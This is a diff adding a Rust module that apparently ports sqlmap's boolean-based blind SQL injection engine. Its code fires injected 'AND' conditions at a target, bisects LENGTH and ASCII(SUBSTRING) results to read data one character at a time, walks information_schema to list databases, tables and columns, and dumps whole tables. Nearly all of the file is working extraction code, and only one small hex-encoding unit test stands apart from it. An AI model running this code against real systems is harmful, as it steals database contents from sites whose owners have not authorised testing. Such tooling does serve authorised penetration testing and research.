@@ -1,0 +1,296 @@
+//! Blind (inference-based) data exfiltration.
+//!
+//! Port of sqlmap `lib/request/inference.py` (bisection over boolean `> N`
+//! conditions) plus the MySQL `information_schema` query set from
+//! `data/xml/queries.xml` used by --dbs / --tables / --columns / --dump.
+//! Only the boolean-based blind channel is ported here; UNION exfiltration
+//! is separate. Queries are MySQL-flavored (matching the ported query set).
+
+use crate::engine::{assemble, build_request};
+use sqlmap_core::config::Config;
+use sqlmap_core::injection::Injection;
+use sqlmap_core::kb::{ColumnEntry, Enumeration, TableDump};
+use sqlmap_http::client::Client;
+use sqlmap_http::comparison::{filtered_page, ratio};
+use sqlmap_http::params::Param;
+
+/// Cap for inferred string length (sqlmap probes up to a similar bound).
+const MAX_LEN: u32 = 64;
+/// Cap for inferred schema/table/column/row counts.
+const MAX_COUNT: u32 = 50;
+
+/// Extracts data character-by-character through a confirmed boolean-based
+/// injection point, using the response comparison ratio as the oracle.
+pub struct BlindExtractor<'a> {
+    client: &'a Client,
+    conf: &'a Config,
+    param: Param,
+    inj: Injection,
+    /// The injection's true page (filtered); conditions compare against it.
+    true_page: String,
+    threshold: f64,
+    seed: u64,
+    pub log: Vec<String>,
+}
+
+/// SQL hex string literal, avoiding quotes inside the injected fragment
+/// (sqlmap does the same to keep string boundaries intact).
+fn hex(s: &str) -> String {
+    let mut out = String::from("0x");
+    for b in s.bytes() {
+        out.push_str(&format!("{b:02x}"));
+    }
+    out
+}
+
+impl<'a> BlindExtractor<'a> {
+    pub fn new(
+        client: &'a Client,
+        conf: &'a Config,
+        param: Param,
+        inj: Injection,
+        true_page: String,
+        threshold: f64,
+    ) -> Self {
+        Self {
+            client,
+            conf,
+            param,
+            inj,
+            true_page,
+            threshold,
+            seed: 0,
+            log: Vec::new(),
+        }
+    }
+
+    /// Fire one boolean condition; true when the page still matches the
+    /// injection's true page (port of `queryPage` used by inference).
+    fn check(&mut self, cond: &str) -> Option<bool> {
+        self.seed += 1;
+        let payload = format!("AND {cond}");
+        let val = assemble(
+            self.conf,
+            &mut self.log,
+            &self.param,
+            &self.inj.boundary,
+            &payload,
+            20000 + self.seed,
+        );
+        let resp = self
+            .client
+            .request(&build_request(self.conf, &self.param, &val))
+            .ok()?;
+        Some(ratio(&self.true_page, &filtered_page(&resp.body)) >= self.threshold)
+    }
+
+    /// Bisect a non-negative integer expression with `expr > mid` probes
+    /// (port of sqlmap's bisect loop in inference mode).
+    /// Returns None when the value exceeds `hi` or a request fails.
+    fn infer_num(&mut self, cond: impl Fn(u32) -> String, hi: u32) -> Option<u32> {
+        if !self.check(&cond(0))? {
+            return Some(0);
+        }
+        if self.check(&cond(hi))? {
+            self.log
+                .push("  inference hit its upper bound - value beyond cap, skipped".into());
+            return None;
+        }
+        let (mut lo, mut hi) = (0u32, hi);
+        while lo < hi {
+            let mid = (lo + hi + 1) / 2;
+            if self.check(&cond(mid))? {
+                lo = mid;
+            } else {
+                hi = mid - 1;
+            }
+        }
+        Some(lo + 1)
+    }
+
+    /// Recover the string value of a scalar subquery (LENGTH bisect, then
+    /// per-position ASCII bisect with an equality confirmation, as sqlmap does).
+    fn infer_string(&mut self, scalar: &str) -> Option<String> {
+        let len = self.infer_num(|n| format!("LENGTH(({scalar}))>{n}"), MAX_LEN)?;
+        if len == 0 {
+            return Some(String::new());
+        }
+        let mut out = String::new();
+        for pos in 1..=len {
+            let v = self.infer_num(
+                |n| format!("ASCII(SUBSTRING(({scalar}),{pos},1))>{n}"),
+                126,
+            );
+            let v = match v {
+                Some(v) if (1..=126).contains(&v) => v,
+                _ => {
+                    out.push('?');
+                    continue;
+                }
+            };
+            // Final equality check rules out a mid-flight false positive.
+            let confirmed = self
+                .check(&format!("ASCII(SUBSTRING(({scalar}),{pos},1))={v}"))
+                .unwrap_or(false);
+            if confirmed {
+                out.push(char::from_u32(v).unwrap_or('?'));
+            } else {
+                out.push('?');
+            }
+        }
+        Some(out)
+    }
+
+    fn infer_count(&mut self, count_q: &str) -> Option<u32> {
+        self.infer_num(|n| format!("({count_q})>{n}"), MAX_COUNT)
+    }
+
+    fn list_schemata(&mut self) -> Option<Vec<String>> {
+        let n = self.infer_count("SELECT COUNT(schema_name) FROM information_schema.schemata")?;
+        let mut out = Vec::new();
+        for i in 0..n {
+            out.push(self.infer_string(&format!(
+                "SELECT schema_name FROM information_schema.schemata LIMIT {i},1"
+            ))?);
+        }
+        Some(out)
+    }
+
+    fn list_tables(&mut self, db: &str) -> Option<Vec<String>> {
+        let n = self.infer_count(&format!(
+            "SELECT COUNT(table_name) FROM information_schema.tables WHERE table_schema={}",
+            hex(db)
+        ))?;
+        let mut out = Vec::new();
+        for i in 0..n {
+            out.push(self.infer_string(&format!(
+                "SELECT table_name FROM information_schema.tables WHERE table_schema={} LIMIT {i},1",
+                hex(db)
+            ))?);
+        }
+        Some(out)
+    }
+
+    fn list_columns(&mut self, db: &str, table: &str) -> Option<Vec<String>> {
+        let n = self.infer_count(&format!(
+            "SELECT COUNT(column_name) FROM information_schema.columns WHERE table_schema={} AND table_name={}",
+            hex(db),
+            hex(table)
+        ))?;
+        let mut out = Vec::new();
+        for i in 0..n {
+            out.push(self.infer_string(&format!(
+                "SELECT column_name FROM information_schema.columns WHERE table_schema={} AND table_name={} LIMIT {i},1",
+                hex(db),
+                hex(table)
+            ))?);
+        }
+        Some(out)
+    }
+
+    fn dump_table(&mut self, db: &str, table: &str, columns: &[String]) -> Option<TableDump> {
+        let n = self.infer_count(&format!("SELECT COUNT(*) FROM {db}.{table}"))?;
+        let mut rows = Vec::new();
+        for i in 0..n {
+            let row = self.infer_string(&format!(
+                "SELECT CONCAT_WS(0x3a,{}) FROM {db}.{table} LIMIT {i},1",
+                columns.join(",")
+            ))?;
+            rows.push(row.split(':').map(|c| c.to_string()).collect::<Vec<_>>());
+        }
+        Some(TableDump {
+            db: db.to_string(),
+            table: table.to_string(),
+            columns: columns.to_vec(),
+            rows,
+        })
+    }
+
+    /// Run the enumeration requested by the config flags.
+    pub fn run(&mut self) -> Enumeration {
+        let mut en = Enumeration::default();
+
+        let mut dbs: Vec<String> = Vec::new();
+        let need_dbs = self.conf.enum_dbs || (self.conf.enum_tables && self.conf.target_db.is_none());
+        if need_dbs {
+            self.log.push("enumerating database names".into());
+            match self.list_schemata() {
+                Some(found) => {
+                    self.log.push(format!("  databases: {}", found.join(", ")));
+                    dbs = found;
+                    if self.conf.enum_dbs {
+                        en.databases = dbs.clone();
+                    }
+                }
+                None => self.log.push("  database enumeration failed (transport/cap)".into()),
+            }
+        }
+
+        if self.conf.enum_tables {
+            let targets: Vec<String> = match &self.conf.target_db {
+                Some(d) => vec![d.clone()],
+                None => dbs.clone(),
+            };
+            for db in targets {
+                self.log.push(format!("enumerating tables in '{db}'"));
+                match self.list_tables(&db) {
+                    Some(tables) => {
+                        self.log.push(format!("  {db}: {}", tables.join(", ")));
+                        en.tables.insert(db.clone(), tables);
+                    }
+                    None => self.log.push(format!("  table enumeration failed for '{db}'")),
+                }
+            }
+        }
+
+        if self.conf.enum_columns || self.conf.dump {
+            match (self.conf.target_db.clone(), self.conf.target_table.clone()) {
+                (Some(db), Some(table)) => {
+                    self.log.push(format!("enumerating columns in '{db}.{table}'"));
+                    match self.list_columns(&db, &table) {
+                        Some(cols) => {
+                            self.log.push(format!("  {db}.{table}: {}", cols.join(", ")));
+                            if self.conf.enum_columns {
+                                en.columns.push(ColumnEntry {
+                                    db: db.clone(),
+                                    table: table.clone(),
+                                    columns: cols.clone(),
+                                });
+                            }
+                            if self.conf.dump {
+                                self.log.push(format!("dumping '{db}.{table}'"));
+                                match self.dump_table(&db, &table, &cols) {
+                                    Some(dump) => {
+                                        self.log.push(format!(
+                                            "  dumped {} row(s) from {db}.{table}",
+                                            dump.rows.len()
+                                        ));
+                                        en.dumps.push(dump);
+                                    }
+                                    None => self.log.push(format!("  dump failed for '{db}.{table}'")),
+                                }
+                            }
+                        }
+                        None => self.log.push(format!("  column enumeration failed for '{db}.{table}'")),
+                    }
+                }
+                _ => self
+                    .log
+                    .push("--columns/--dump require -D <db> and -T <table> - skipped".into()),
+            }
+        }
+
+        en
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn hex_encodes_ascii() {
+        assert_eq!(hex("shop"), "0x73686f70");
+        assert_eq!(hex(""), "0x");
+    }
+}
